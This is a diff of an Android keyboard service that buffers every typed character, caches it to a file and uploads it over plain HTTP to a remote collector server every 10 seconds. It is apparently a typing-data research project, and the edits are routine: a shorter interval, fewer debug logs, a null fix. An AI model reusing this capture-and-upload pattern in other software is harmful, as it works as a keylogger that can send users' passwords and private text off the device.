@@ -25,7 +25,7 @@ import hr.fer.keyboard.R;
 
 public class KeyboardCollectorService extends  InputMethodService
         implements KeyboardView.OnKeyboardActionListener {
-    public static final long NOTIFY_INTERVAL = 60 * 1000; // 10 seconds
+    public static final long NOTIFY_INTERVAL = 10 * 1000; // 10 seconds
     private final String PATH = "./cache.txt";
     private final String SERVER_PATH = "http://collector-env-1.2ta8wpyecx.us-east-2.elasticbeanstalk.com/keyboard/store";
     private File cache;
@@ -85,8 +85,6 @@ public class KeyboardCollectorService extends  InputMethodService
 
     @Override
     public void onKey(int primaryCode, int[] keyCodes) {
-        Log.d("Key", "Key pressed");
-        Log.d("Key", "Key pressed");
         InputConnection ic = getCurrentInputConnection();
 
         switch (primaryCode) {
@@ -112,7 +110,6 @@ public class KeyboardCollectorService extends  InputMethodService
                 ic.commitText(String.valueOf(code), 1);
 
                 typedText.append(code);
-                Log.d("Text typed", "char " + code);
                 if (typedText.length() == 10) {
                     try {
                         writeToCache(typedText.toString());
@@ -160,7 +157,6 @@ public class KeyboardCollectorService extends  InputMethodService
 
     public void writeToCache(String text) throws IOException {
         BufferedWriter stream = new BufferedWriter(new FileWriter(cache, true));
-        Log.d("Writing to cache...", text);
         stream.write(text);
         stream.close();
     }
@@ -172,8 +168,7 @@ public class KeyboardCollectorService extends  InputMethodService
         FileInputStream in = new FileInputStream(cache);
         in.read(bytes);
         String contents = new String(bytes);
-
-        Log.d("Read from cache", contents);
+        Log.d("cache", contents);
 
         cache.delete();
         cache.createNewFile();
@@ -189,7 +184,7 @@ public class KeyboardCollectorService extends  InputMethodService
             e.printStackTrace();
         }
 
-        if(contents.length() == 0) return null;
+        if(contents.length() == 0) return new HashMap<>();
 
         HashMap<String, String> postDataParams = new HashMap<>();
         postDataParams.put("account", account);
@@ -209,8 +204,9 @@ public class KeyboardCollectorService extends  InputMethodService
                     Log.d("CacheTimer", "Sending to server...");
                     //send cached text to server
                     HashMap<String, String> params = preparePOSTParams();
-                    if(params == null) return;
-                    new PostDataToServer(SERVER_PATH, preparePOSTParams()).execute();
+                    if(params == null || params.isEmpty()) return;
+
+                    new PostDataToServer(SERVER_PATH, params).execute();
                 }
 
             });
